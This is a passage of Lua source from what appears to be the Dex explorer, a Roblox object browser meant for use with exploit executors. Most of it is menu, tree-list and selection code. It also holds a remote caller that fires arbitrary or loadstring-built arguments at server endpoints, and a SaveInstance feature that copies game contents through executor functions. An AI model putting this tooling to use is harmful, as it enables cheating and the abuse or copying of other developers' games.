	local success,err = pcall(function() Instance.new(IName) end)
	if err then
		return false
	else
		return true
	end
end

function GetClasses()
	if RbxApi == nil then return {} end
	local classTable = {}
	for i,v in pairs(RbxApi.Classes) do
		if ClassCanCreate(v.Name) then
			table.insert(classTable,v.Name)
		end
	end
	return classTable
end

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function FunctionIsHidden(functionData)
	local tags = functionData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

local function GetAllFunctions(className)
	local class = RbxApi.Classes[className]
	local functions = {}
	
	if not class then return functions end
	
	while class do
		if class.Name == "Instance" then break end
		for _,nextFunction in pairs(class.Functions) do
			if not FunctionIsHidden(nextFunction) then
				table.insert(functions, nextFunction)
			end
		end
		class = RbxApi.Classes[class.Superclass]
	end
	
	sortAlphabetic(functions, "Name")

	return functions
end

function GetFunctions()
	if RbxApi == nil then return {} end
	local List = SelectionVar():Get()
	
	if #List == 0 then return end
	
	local MyObject = List[1]
	
	local functionTable = {}
	for i,v in pairs(GetAllFunctions(MyObject.ClassName)) do
		table.insert(functionTable,v)
	end
	return functionTable
end

function CreateInsertObjectMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a < b end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,200,1,0)
		menu.CanvasSize = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end,1)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateFunctionCallerMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a.Name < b.Name end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,300,1,0)
		menu.CanvasSize = UDim2.new(0, 300, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
		
		local function GetParameters(functionData)
			local paraString = ""
			paraString = paraString.."("
			for i,v in pairs(functionData.Arguments) do
				paraString = paraString..v.Type.." "..v.Name
				if i < #functionData.Arguments then
					paraString = paraString..", "
				end
			end
			paraString = paraString..")"
			return paraString
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name.ReturnType.." "..name.Name..GetParameters(name), function()
				choice(name)
			end,2)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateInsertObject()
	if not CurrentInsertObjectWindow then return end
	CurrentInsertObjectWindow.Visible = true
	if currentRightClickMenu and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset-2,0,0)
	end
	if CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Parent = explorerPanel.Parent
	end
end

function CreateFunctionCaller()
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow:Destroy()
		CurrentFunctionCallerWindow = nil
	end
	CurrentFunctionCallerWindow = CreateFunctionCallerMenu(
		GetFunctions(),
		"",
		false,
		function(option)
			CurrentFunctionCallerWindow:Destroy()
			CurrentFunctionCallerWindow = nil
			local list = SelectionVar():Get()
			for i = 1,#list do
				pcall(function() Instance.new(option,list[i]) end)
			end
			print(option.Name .. " selected to be called. Function caller being added soon, please wait!")
			--CallFunction()
			DestroyRightClick()
		end
	)
	if currentRightClickMenu and CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset*1.5-2,0,0)
	end
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Parent = explorerPanel.Parent
	end
end

function CreateRightClickMenuItem(text, onClick, insObj)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	if insObj == 1 then
		local newIcon = Icon(nil,ExplorerIndex[text] or 0)
		newIcon.Position = UDim2.new(0,0,0,2)
		newIcon.Size = UDim2.new(0,16,0,16)
		newIcon.IconMap.ZIndex = 5
		newIcon.Parent = button
		button.Text = "\t\t"..button.Text
	elseif insObj == 2 then
		button.FontSize = Enum.FontSize.Size11
	end
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
		if not insObj and CurrentInsertObjectWindow then
			if CurrentInsertObjectWindow.Visible == false and button.Text == "Insert Object" then
				CreateInsertObject()
			elseif CurrentInsertObjectWindow.Visible and button.Text ~= "Insert Object" then
				CurrentInsertObjectWindow.Visible = false
			end
		end
		if not insObj then
			if CurrentFunctionCallerWindow and button.Text ~= "Call Function" then
				CurrentFunctionCallerWindow:Destroy()
				CurrentFunctionCallerWindow = nil
			elseif button.Text == "Call Function" then
				CreateFunctionCaller()
			end
		end
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
		onClick(text)
	end)	
	return button
end

function CreateRightClickMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()

	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			frame:Destroy()
			DestroyRightClick()
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 5)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

local clipboard = {}
local function delete(o)
	o.Parent = nil
end

local getTextWidth do
	local text = Create('TextLabel',{
		Name = "TextWidth";
		TextXAlignment = 'Left';
		TextYAlignment = 'Center';
		Font = FONT;
		FontSize = FONT_SIZE;
		Text = "";
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,1,0);
		Visible = false;
		Parent = explorerPanel;
	})
	function getTextWidth(s)
		text.Text = s
		return text.TextBounds.x
	end
end

local nameScanned = false
-- Holds the game tree converted to a list.
local TreeList = {}
-- Matches objects to their tree node representation.
local NodeLookup = {}

local nodeWidth = 0

local QuickButtons = {}

function filteringWorkspace()
	if explorerFilter.Text ~= "" and explorerFilter.Text ~= "Filter Workspace" then
		return true
	end
	return false
end

function lookForAName(obj,name)
	for i,v in pairs(obj:GetChildren()) do
		if string.find(string.lower(v.Name),string.lower(name)) then nameScanned = true end
		lookForAName(v,name)
	end
end

function scanName(obj)
	nameScanned = false
	if string.find(string.lower(obj.Name),string.lower(explorerFilter.Text)) then
		nameScanned = true
	else
		lookForAName(obj,explorerFilter.Text)
	end
	return nameScanned
end

function updateActions()
	for i,v in pairs(QuickButtons) do
		if v.Cond() then
			v.Toggle(true)
		else
			v.Toggle(false)
		end
	end
end

local updateList,rawUpdateList,updateScroll,rawUpdateSize do
	local function r(t)
		for i = 1,#t do
			if not filteringWorkspace() or scanName(t[i].Object) then
				TreeList[#TreeList+1] = t[i]

				local w = (t[i].Depth)*(2+ENTRY_PADDING+GUI_SIZE) + 2 + ENTRY_SIZE + 4 + getTextWidth(t[i].Object.Name) + 4
				if w > nodeWidth then
					nodeWidth = w
				end
				if t[i].Expanded or filteringWorkspace() then
					r(t[i])
				end
			end
		end
	end

	function rawUpdateSize()
		scrollBarH.TotalSpace = nodeWidth
		scrollBarH.VisibleSpace = listFrame.AbsoluteSize.x
		scrollBarH:Update()
		local visible = scrollBarH:CanScrollDown() or scrollBarH:CanScrollUp()
		scrollBarH.GUI.Visible = visible

		listFrame.Size = UDim2.new(1,-GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

		scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
		scrollBar.GUI.Size = UDim2.new(0,GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)
		
		scrollBar.TotalSpace = #TreeList+1
		scrollBar:Update()
	end

	function rawUpdateList()
		-- Clear then repopulate the entire list. It appears to be fast enough.
		TreeList = {}
		nodeWidth = 0
		r(NodeLookup[workspace.Parent])
		if DexStorageEnabled then
			r(NodeLookup[DexStorage])
		end
		if NilStorageEnabled then
			r(NodeLookup[NilStorage])
		end
		rawUpdateSize()
		updateActions()
	end

	-- Adding or removing large models will cause many updates to occur. We
	-- can reduce the number of updates by creating a delay, then dropping any
	-- updates that occur during the delay.
	local updatingList = false
	function updateList()
		if updatingList then return end
		updatingList = true
		wait(0.25)
		updatingList = false
		rawUpdateList()
	end

	local updatingScroll = false
	function updateScroll()
		if updatingScroll then return end
		updatingScroll = true
		wait(0.25)
		updatingScroll = false
		scrollBar:Update()
	end
end

local Selection do
	local bindGetSelection = explorerPanel:FindFirstChild("GetSelection")
	if not bindGetSelection then
		bindGetSelection = Create('BindableFunction',{Name = "GetSelection"})
		bindGetSelection.Parent = explorerPanel
	end

	local bindSetSelection = explorerPanel:FindFirstChild("SetSelection")
	if not bindSetSelection then
		bindSetSelection = Create('BindableFunction',{Name = "SetSelection"})
		bindSetSelection.Parent = explorerPanel
	end

	local bindSelectionChanged = explorerPanel:FindFirstChild("SelectionChanged")
	if not bindSelectionChanged then
		bindSelectionChanged = Create('BindableEvent',{Name = "SelectionChanged"})
		bindSelectionChanged.Parent = explorerPanel
	end

	local SelectionList = {}
	local SelectionSet = {}
	local Updates = true
	Selection = {
		Selected = SelectionSet;
		List = SelectionList;
	}

	local function addObject(object)
		-- list update
		local lupdate = false
		-- scroll update
		local supdate = false

		if not SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				table.insert(SelectionList,object)
				SelectionSet[object] = true
				node.Selected = true

				-- expand all ancestors so that selected node becomes visible
				node = node.Parent
				while node do
					if not node.Expanded then
						node.Expanded = true
						lupdate = true
					end
					node = node.Parent
				end
				supdate = true
			end
		end
		return lupdate,supdate
	end

	function Selection:Set(objects)
		local lupdate = false
		local supdate = false

		if #SelectionList > 0 then
			for i = 1,#SelectionList do
				local object = SelectionList[i]
				local node = NodeLookup[object]
				if node then
					node.Selected = false
					SelectionSet[object] = nil
				end
			end

			SelectionList = {}
			Selection.List = SelectionList
			supdate = true
		end

		for i = 1,#objects do
			local l,s = addObject(objects[i])
			lupdate = l or lupdate
			supdate = s or supdate
		end

		if lupdate then
			rawUpdateList()
			supdate = true
		elseif supdate then
			scrollBar:Update()
		end

		if supdate then
			bindSelectionChanged:Fire()
			updateActions()
		end
	end

	function Selection:Add(object)
		local l,s = addObject(object)
		if l then
			rawUpdateList()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		elseif s then
			scrollBar:Update()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end
	
	function Selection:StopUpdates()
		Updates = false
	end
	
	function Selection:ResumeUpdates()
		Updates = true
		bindSelectionChanged:Fire()
		updateActions()
	end

	function Selection:Remove(object,noupdate)
		if SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				node.Selected = false
				SelectionSet[object] = nil
				for i = 1,#SelectionList do
					if SelectionList[i] == object then
						table.remove(SelectionList,i)
						break
					end
				end

				if not noupdate then
					scrollBar:Update()
				end
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end

	function Selection:Get()
		local list = {}
		for i = 1,#SelectionList do
			list[i] = SelectionList[i]
		end
		return list
	end

	bindSetSelection.OnInvoke = function(...)
		Selection:Set(...)
	end

	bindGetSelection.OnInvoke = function()
		return Selection:Get()
	end
end

function CreateCaution(title,msg)
	local newCaution = CautionWindow:Clone()
	newCaution.Title.Text = title
	newCaution.MainWindow.Desc.Text = msg
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

function CreateTableCaution(title,msg)
	if type(msg) ~= "table" then return CreateCaution(title,tostring(msg)) end
	local newCaution = TableCautionWindow:Clone()
	newCaution.Title.Text = title
	
	local TableList = newCaution.MainWindow.TableResults
	local TableTemplate = newCaution.MainWindow.TableTemplate
	
	for i,v in pairs(msg) do
		local newResult = TableTemplate:Clone()
		newResult.Type.Text = type(v)
		newResult.Value.Text = tostring(v)
		newResult.Position = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Parent = TableList
		TableList.CanvasSize = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Visible = true
	end
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Number" then
		return tonumber(value)
	elseif type == "String" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif type == "Script" then
		local success,err = ypcall(function()
		_G.D_E_X_DONOTUSETHISPLEASE = nil
		loadstring(
			"_G.D_E_X_DONOTUSETHISPLEASE = "..value
		)()
		return _G.D_E_X_DONOTUSETHISPLEASE
		end)
		if err then
			return nil
		end
	else
		return nil
	end
end

local function ToPropValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif string.sub(value,1,4) == "Enum" then
		local getEnum = value
		while true do
			local x,y = string.find(getEnum,".")
			if y then
				getEnum = string.sub(getEnum,y+1)
			else
				break
			end
		end
		print(getEnum)
		return getEnum
	else
		return nil
	end
end

function PromptRemoteCaller(inst)
	if CurrentRemoteWindow then
		CurrentRemoteWindow:Destroy()
		CurrentRemoteWindow = nil
	end
	CurrentRemoteWindow = RemoteWindow:Clone()
	CurrentRemoteWindow.Parent = explorerPanel.Parent
	CurrentRemoteWindow.Visible = true
	
	local displayValues = false
	
	local ArgumentList = CurrentRemoteWindow.MainWindow.Arguments
	local ArgumentTemplate = CurrentRemoteWindow.MainWindow.ArgumentTemplate
	
	if inst:IsA("RemoteEvent") then
		CurrentRemoteWindow.Title.Text = "Fire Event"
		CurrentRemoteWindow.MainWindow.Ok.Text = "Fire"
		CurrentRemoteWindow.MainWindow.DisplayReturned.Visible = false
		CurrentRemoteWindow.MainWindow.Desc2.Visible = false
	end
	
	local newArgument = ArgumentTemplate:Clone()
	newArgument.Parent = ArgumentList
	newArgument.Visible = true
	newArgument.Type.MouseButton1Down:connect(function()
		createDDown(newArgument.Type,function(choice)
			newArgument.Type.Text = choice
		end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
	end)
	
	CurrentRemoteWindow.MainWindow.Ok.MouseButton1Up:connect(function()
		if CurrentRemoteWindow and inst.Parent ~= nil then
			local MyArguments = {}
			for i,v in pairs(ArgumentList:GetChildren()) do
				table.insert(MyArguments,ToValue(v.Value.Text,v.Type.Text))
			end
			if inst:IsA("RemoteFunction") then
				if displayValues then
					spawn(function()
						local myResults = inst:InvokeServer(unpack(MyArguments))
						if myResults then
							CreateTableCaution("Remote Caller",myResults)
						else
							CreateCaution("Remote Caller","This remote did not return anything.")
						end
					end)
				else
					spawn(function()
						inst:InvokeServer(unpack(MyArguments))
					end)
				end
			else
				inst:FireServer(unpack(MyArguments))
			end
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Add.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			local newArgument = ArgumentTemplate:Clone()
			newArgument.Position = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Parent = ArgumentList
			ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Visible = true
			newArgument.Type.MouseButton1Down:connect(function()
				createDDown(newArgument.Type,function(choice)
					newArgument.Type.Text = choice
				end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
			end)
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Subtract.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			if #ArgumentList:GetChildren() > 1 then
				ArgumentList:GetChildren()[#ArgumentList:GetChildren()]:Destroy()
				ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			end
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.DisplayReturned.MouseButton1Up:connect(function()
		if displayValues then
			displayValues = false
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = false
		else
			displayValues = true
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = true
		end
	end)
end

function PromptSaveInstance(inst)
	if not SaveInstance and not _G.SaveInstance then CreateCaution("SaveInstance Missing","You do not have the SaveInstance function installed. Please go to RaspberryPi's thread to retrieve it.") return end
	if CurrentSaveInstanceWindow then
		CurrentSaveInstanceWindow:Destroy()
		CurrentSaveInstanceWindow = nil
		if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
			explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
		end
	end
	CurrentSaveInstanceWindow = SaveInstanceWindow:Clone()
	CurrentSaveInstanceWindow.Parent = explorerPanel.Parent
	CurrentSaveInstanceWindow.Visible = true
	
	local filename = CurrentSaveInstanceWindow.MainWindow.FileName
	local saveObjects = true
	local overwriteCaution = false
	
	CurrentSaveInstanceWindow.MainWindow.Save.MouseButton1Up:connect(function()
		if readfile and getelysianpath then
			if readfile(getelysianpath()..filename.Text..".rbxmx") then
				if not overwriteCaution then
					overwriteCaution = true
					local newCaution = ConfirmationWindow:Clone()
					newCaution.Name = "SaveInstanceOverwriteCaution"
					newCaution.MainWindow.Desc.Text = "The file, "..filename.Text..".rbxmx, already exists. Overwrite?"
					newCaution.Parent = explorerPanel.Parent
					newCaution.Visible = true
					newCaution.MainWindow.Yes.MouseButton1Up:connect(function()
						ypcall(function()
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						end)
						overwriteCaution = false
						newCaution:Destroy()
						if CurrentSaveInstanceWindow then
							CurrentSaveInstanceWindow:Destroy()
							CurrentSaveInstanceWindow = nil
						end
					end)
					newCaution.MainWindow.No.MouseButton1Up:connect(function()
						overwriteCaution = false
						newCaution:Destroy()
					end)
				end
			else
				ypcall(function()
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				end)
				if CurrentSaveInstanceWindow then
					CurrentSaveInstanceWindow:Destroy()
					CurrentSaveInstanceWindow = nil
					if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
						explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
					end
				end
			end
		else
			ypcall(function()
				if SaveInstance then
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				else
					_G.SaveInstance(inst,filename.Text,not saveObjects)
				end
			end)
			if CurrentSaveInstanceWindow then
				CurrentSaveInstanceWindow:Destroy()
				CurrentSaveInstanceWindow = nil
				if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
					explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
				end
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentSaveInstanceWindow then
			CurrentSaveInstanceWindow:Destroy()
			CurrentSaveInstanceWindow = nil
			if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
				explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.SaveObjects.MouseButton1Up:connect(function()
		if saveObjects then
			saveObjects = false
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = false
		else
			saveObjects = true
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = true
		end
	end)
end

function DestroyRightClick()
	if currentRightClickMenu then
		currentRightClickMenu:Destroy()
		currentRightClickMenu = nil
	end
	if CurrentInsertObjectWindow and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Visible = false
	end
end

function rightClickMenu(sObj)
	local mouse = game.Players.LocalPlayer:GetMouse()
	
	currentRightClickMenu = CreateRightClickMenu(
		{"Cut","Copy","Paste Into","Duplicate","Delete","Group","Ungroup","Select Children","Teleport To","Insert Part","Insert Object","View Script","Save Instance","Call Function","Call Remote"},
		"",
		false,
		function(option)
			if option == "Cut" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				local cut = {}
				for i = 1,#list do
					local obj = list[i]:Clone()
					if obj then
						table.insert(clipboard,obj)
						table.insert(cut,list[i])
					end
				end
				for i = 1,#cut do
					pcall(delete,cut[i])
				end
				updateActions()
			elseif option == "Copy" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				for i = 1,#list do
					table.insert(clipboard,list[i]:Clone())
				end
				updateActions()
			elseif option == "Paste Into" then
				if not Option.Modifiable then return end
				local parent = Selection.List[1] or workspace
				for i = 1,#clipboard do
					clipboard[i]:Clone().Parent = parent
				end
			elseif option == "Duplicate" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
